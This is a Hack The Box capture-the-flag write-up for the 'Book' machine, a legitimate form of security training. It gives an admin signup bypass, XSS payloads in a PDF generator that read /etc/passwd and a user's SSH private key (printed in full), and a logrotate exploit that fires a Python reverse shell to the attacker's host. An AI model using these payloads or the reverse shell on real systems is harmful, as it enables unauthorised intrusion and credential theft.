---
title: "[HTB] Book WriteUp"
date: 2020-07-11T12:00:00-00:00
categories:
  - writeup
excerpt: "Book is a medium difficulty machine on Hack the Box. As always we begin by running an nmap scan."
tags:
  - HTB
  - Hack The Box
  - Book
  - WriteUp
---

![Book]({{ site.url }}{{ site.baseurl }}/assets/book/book.jpg)


Book is a medium difficulty machine on Hack the Box. 

As always we begin by running an nmap scan.

```bash
nmap -sC -sV -oN scans/nmap 10.10.10.176
```
```bash
# Nmap 7.80 scan initiated Thu May 14 18:48:42 2020 as: nmap -sC -sV -oN scans/nmap 10.10.10.176
Nmap scan report for 10.10.10.176
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 14 18:48:50 2020 -- 1 IP address (1 host up) scanned in 8.18 seconds

```


There are two open ports 22 and 80, lets look at the website on port 80.

![Login]({{ site.url }}{{ site.baseurl }}/assets/book/login.jpg)

We get a login page, so lets sign up. When we sign in we arrive at a Library's website. 

![Library]({{ site.url }}{{ site.baseurl }}/assets/book/library.jpg)

After poking around a bit we find there is an admin account admin@book.htb on the contact page. We also see that the user's page signifies the users role. There is also an upload function on the collections page.

Running Dirbuster also finds a /admin/ page.

We can try signing up for an account using the existing admin@book.htb account. Using BurpSuite we must pad out the request to 21 characters in order to bypass the JavaScript form validation. We can do this with spaces, the final character is arbitrary.

```
name=admin&email=admin@book.htb      X&password=password1
```

After logging in to the admin account we see in the user settings that the account only has 'User' role. Using the admin credentials on the /admin/ page doesn't work. If we repeat the process but change the name to admin1 we are able to login to the admin page. 

On the Collections page, the admin is able to download the collection as a PDF. The site generates these PDFs using the info supplied by the user, so we can use DOM manipulation to execute javascript, as described in this article 

[www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)

The following payload will return /etc/passwd

```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

After downloading the collections PDF we get /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:GnatsBug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd NetworkManagement,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemdResolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
reader:x:1000:1000:reader:/home/reader:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

We can see there is a user called reader, we can try to get the SSH key for this user by modifying our payload slightly.

```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

After downloading the collections PDF again we get an SSH key:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----
```


We can now SSH in as reader@10.10.10.176.

We find User.txt in the home folder.

![Reader]({{ site.url }}{{ site.baseurl }}/assets/book/reader.jpg)

### Priv Esc

I start by running linPeas, which finds some interesting things

![linpeas]({{ site.url }}{{ site.baseurl }}/assets/book/linpeas.jpg)

We see that this machine is vulnerable to Logrotate exploitation. We can write to the log files in the backups folder in reader's home directory. Following the links from linPeas we get an exploit that we can use. [Logrotten](https://github.com/whotwagner/logrotten).

We transfer this to the target machine using wget. Then compile it:

```bash
reader@book:~ gcc -o logrotten logrotten.c
```

Then we will need a payload, We can use a python reverse shell from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). 

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.53",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Then set up a listener on the attacking machine.

```bash
nv -lvnp 9001
```

Then execute the exploit

```bash
reader@book:~ ./logrotten -p ./payloadfile /home/reader/backups/access.log
Waiting for rotating backups/access.log...
```

If we now write random data to the log, it should trigger our payload.

```bash
head -c 10M < /dev/urandom > access.log
```

And we get a reverse shell!

I found the shell was very unstable so had to quickly cat root.txt before the shell dropped.